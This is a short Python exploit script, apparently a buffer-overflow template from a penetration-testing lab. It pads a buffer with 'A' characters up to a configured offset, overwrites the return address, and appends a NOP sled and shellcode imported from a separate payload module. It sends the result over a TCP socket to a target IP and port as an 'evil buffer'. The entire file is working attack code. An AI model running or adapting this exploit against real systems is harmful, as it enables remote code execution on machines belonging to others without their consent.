import json
import time
import socket
import sys
import config

def run():
	padding = config.buf
	buf = config.buf
	if config.payload_ready:
		import payload
		buf = payload.buf
		padding = "\x90"*16

	runexploit(config.target_ip, config.target_port, config.prefix, config.retn, config.offset, padding, buf, config.postfix)

def runexploit(ip, port, prefix, retn, offset, padding, buf, postfix):
	overflow = "A" * offset
	buffer = prefix + overflow + retn + padding + buf + postfix

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		s.connect((ip, port))
		print("Sending evil buffer...")
		s.send(buffer + "\r\n")
		print("Done!")
	except:
		print("Could not connect.")


run()